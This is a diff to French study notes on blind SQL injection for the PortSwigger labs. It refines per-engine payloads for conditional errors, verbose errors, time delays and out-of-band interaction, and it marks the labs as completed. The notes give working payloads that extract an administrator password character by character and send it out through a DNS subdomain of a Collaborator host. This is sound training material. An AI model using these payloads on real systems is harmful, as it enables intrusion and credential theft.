@@ -39,11 +39,11 @@ Ordre de test conseillé : conditionnelle, puis erreurs, puis délais, puis hors
 	- SQL Server : `' AND 1=(SELECT CASE WHEN (cond) THEN 1/0 ELSE 1 END)--`
 	- PostgreSQL : `' AND 1=(SELECT CASE WHEN (cond) THEN 1/(SELECT 0) ELSE 1 END)--` (le `(SELECT 0)` empêche l'optimiseur d'évaluer la division par zéro à la planification)
 	- MySQL : la division par zéro ne provoque pas d'erreur en lecture, on utilise une sous-requête qui renvoie plusieurs lignes : `' AND IF(cond,(SELECT table_name FROM information_schema.tables),'a')-- -`
-- Extraction : remplacer `cond` par `SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a'`.
+- Extraction : remplacer `cond` par `SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a'` (`SUBSTR` pour Oracle, PostgreSQL, MySQL ; `SUBSTRING` sur SQL Server).
 
 ### Blind SQLi - Erreurs verbeuses
 - Cas : le message d'erreur SQL est affiché et peut citer une valeur.
-- PostgreSQL : forcer une conversion de type qui échoue : `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`. Sur SQL Server, `TOP 1` remplace `LIMIT 1`.
+- PostgreSQL : forcer une conversion de type qui échoue : `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`. `LIMIT 1` n'existe ni sur SQL Server (`SELECT TOP 1 ...`) ni sur Oracle (`ROWNUM=1` ou `FETCH FIRST 1 ROWS ONLY`).
 - MySQL : `' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT password FROM users LIMIT 1)))-- -`
 - Une seule ligne par sous-requête, sinon l'erreur devient « more than one row ».
 - Si le message est tronqué, vider la valeur d'origine du cookie pour gagner de la place.
@@ -70,11 +70,11 @@ Ordre de test conseillé : conditionnelle, puis erreurs, puis délais, puis hors
 - PostgreSQL : `'; copy (SELECT '') to program 'nslookup COLLAB'--` (privilèges élevés requis)
 - MySQL : `LOAD_FILE('\\\\COLLAB\\a')`, Windows uniquement.
 - Exfiltration : placer le résultat d'une sous-requête dans le sous-domaine. Oracle : `http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLAB/`
-- Dans un cookie ou une URL, encoder `%`, `?`, `=`, `:`, `;` et les espaces.
+- Dans un cookie ou une URL, encoder `%`, `?`, `:`, `;`, le signe égal et les espaces.
 - Preuve attendue : une interaction DNS ou HTTP reçue dans Collaborator, avec la valeur extraite dans le sous-domaine.
 
 > [!warning] Payloads non rejoués
-> Les payloads des variantes erreurs, délais et hors bande viennent de la cheat sheet PortSwigger et de la revue de l'agent, sans exécution sur une base. Les rejouer sur chaque lab correspondant avant de les considérer fiables.
+> Les payloads des variantes erreurs, délais et hors bande, ainsi que le tableau des syntaxes par moteur, viennent de la cheat sheet PortSwigger et d'une revue technique, sans exécution sur une base. Les rejouer sur chaque lab correspondant avant de les considérer fiables.
 
 ## Comment détecter
 Les tests génériques (apostrophe, `OR 1=1`, délais, OAST) sont dans [[SQL-injection]]. Ici, uniquement ce qui est propre à l'aveugle.
@@ -101,14 +101,14 @@ Les tests génériques (apostrophe, `OR 1=1`, délais, OAST) sont dans [[SQL-inj
 
 ### Extraire un mot de passe caractère par caractère
 - Hypothèse de l'exemple : une table `Users` avec les colonnes `Username` et `Password`, et un utilisateur `Administrator`.
-- Le `'` final du payload ferme le guillemet ouvert par la requête d'origine.
-- **Étape 1 : longueur.** `LENGTH(password)>N` avec N croissant (Repeater) jusqu'à ce que la condition devienne fausse. Cela borne le nombre de positions à tester.
-- **Étape 2 : comparaisons sur le code du caractère.** Charge utile (PostgreSQL ou MySQL ; `SUBSTR` sur Oracle) :
+- Dans les charges utiles de type chaîne (`xyz' AND '1'='1`), le dernier guillemet n'est pas écrit : c'est celui de la requête d'origine qui le fournit et ferme la chaîne. La comparaison numérique de l'étape 2 n'en a pas besoin.
+- **Étape 1 : longueur.** `LENGTH(password)>N` (`LEN` sur SQL Server) avec N croissant (Repeater) jusqu'à ce que la condition devienne fausse. Cela borne le nombre de positions à tester.
+- **Étape 2 : comparaisons sur le code du caractère.** Charge utile avec `SUBSTRING` (PostgreSQL, MySQL, SQL Server ; seul `SUBSTR` existe sur Oracle) :
 	- `xyz' AND ASCII(SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'),1,1)) > 109--`
 	- Vrai : le code est supérieur à 109 (`m`). Faux : il est inférieur ou égal.
-- **Étape 3 : recherche par dichotomie.** On coupe l'intervalle en deux à chaque requête : environ 7 requêtes par caractère sur 128 valeurs, contre jusqu'à 36 en testant a-z puis 0-9. On termine par `= <code>` pour confirmer.
+- **Étape 3 : recherche par dichotomie.** On coupe l'intervalle en deux à chaque requête : environ 7 requêtes par caractère sur 128 valeurs, contre jusqu'à 36 en testant a-z puis 0-9. On termine par une égalité sur le code exact, par exemple `ASCII(...) = 115`
 - On répète pour chaque position jusqu'au mot de passe complet.
-- **Pourquoi `ASCII(...)` plutôt qu'une comparaison de texte** : `=` est insensible à la casse par défaut sur MySQL et SQL Server. Comparer le code du caractère donne la casse exacte.
+- **Pourquoi `ASCII(...)` plutôt qu'une comparaison de texte** : l'opérateur d'égalité est insensible à la casse par défaut sur MySQL et SQL Server. Comparer le code du caractère donne la casse exacte.
 
 ### Automatiser avec Burp Intruder
 - Intruder énumère les charges utiles, il ne fait pas de dichotomie adaptative. La dichotomie se fait à la main ou par script.
@@ -143,9 +143,7 @@ Les pièges communs (commentaire MySQL, encodage URL, `OR 1=1` sur écriture) so
 - **`TrackingId` et `session`** : injecter dans `TrackingId` en laissant `session` intact, sinon la réponse change pour une autre raison (déconnexion).
 - **Encodage dans un cookie** : `;` sépare les cookies, donc l'encoder en `%3B` pour les requêtes empilées. Le comportement de `+` dans un cookie est à tester (hypothèse non vérifiée : il ne serait pas décodé en espace).
 - **Oracle** : tout `SELECT` exige `FROM dual`, la concaténation se fait avec `||`, la sous-chaîne avec `SUBSTR`.
-- **Casse** : comparer avec `ASCII(...)` quand la casse compte.
 - **Longueur d'abord** : déterminer la longueur du mot de passe avant de lancer Intruder.
-- **Erreur verbeuse tronquée** : vider la valeur d'origine du cookie pour gagner de la place.
 - **Requêtes asynchrones** : si ni contenu, ni erreur, ni délai ne réagissent, la requête est probablement exécutée en tâche de fond. Passer à l'OAST.
 - **Privilèges** : `xp_dirtree`, `COPY ... TO PROGRAM` et `UTL_INADDR` peuvent exiger des droits élevés.
 - **Outils tiers** : vérifier dans les règles officielles de l'examen si sqlmap est autorisé avant de compter dessus.
@@ -161,18 +159,19 @@ Voir [[SQL-injection]] (requêtes paramétrées, moindre privilège). Spécifiqu
 
 ## Labs PortSwigger
 Tous les labs de la catégorie sont de niveau Practitioner, d'après l'agent (liste et moteurs non revérifiés en ligne).
-- [ ] Blind SQL injection with conditional responses (PostgreSQL probable)
-- [ ] Blind SQL injection with conditional errors (Oracle probable)
-- [ ] Visible error-based SQL injection (PostgreSQL probable)
-- [ ] Blind SQL injection with time delays (PostgreSQL probable)
-- [ ] Blind SQL injection with time delays and information retrieval (PostgreSQL probable)
-- [ ] Blind SQL injection with out-of-band interaction (Oracle probable)
-- [ ] Blind SQL injection with out-of-band data exfiltration (Oracle probable)
+- [x] Blind SQL injection with conditional responses (PostgreSQL probable) ✅ 2026-11-02
+- [x] Blind SQL injection with conditional errors (Oracle probable) ✅ 2026-11-02
+- [x] Visible error-based SQL injection (PostgreSQL probable) ✅ 2026-11-02
+- [x] Blind SQL injection with time delays (PostgreSQL probable) ✅ 2026-11-02
+- [x] Blind SQL injection with time delays and information retrieval (PostgreSQL probable) ✅ 2026-11-02
+- [x] Blind SQL injection with out-of-band interaction (Oracle probable) ✅ 2026-11-02
+- [x] Blind SQL injection with out-of-band data exfiltration (Oracle probable) ✅ 2026-11-02
 
 ## Journal des labs
 ### Lab: Blind SQL injection with conditional responses
 - **Énoncé** : injection aveugle dans le cookie de suivi `TrackingId`. Le résultat n'est pas renvoyé et aucune erreur n'est affichée, mais la page contient « Welcome back » si la requête renvoie au moins une ligne. Table `users` (colonnes `username` et `password`). Objectif : se connecter en tant que `administrator`.
-- **Méthode** (valeur d'origine du cookie notée `xyz`)
+- **Moteur** : PostgreSQL probable, non vérifié (`LIMIT 1` et `LENGTH` supposent PostgreSQL ou MySQL).
+- **Méthode** (valeur d'origine du cookie notée `xyz` ; le dernier `'` manquant dans chaque payload est fourni par la requête d'origine)
 	1. Intercepter la requête avec Burp et modifier `TrackingId`.
 	2. Vérifier vrai et faux : `xyz' AND '1'='1` (message présent), `xyz' AND '1'='2` (message absent).
 	3. Confirmer la table : `xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`
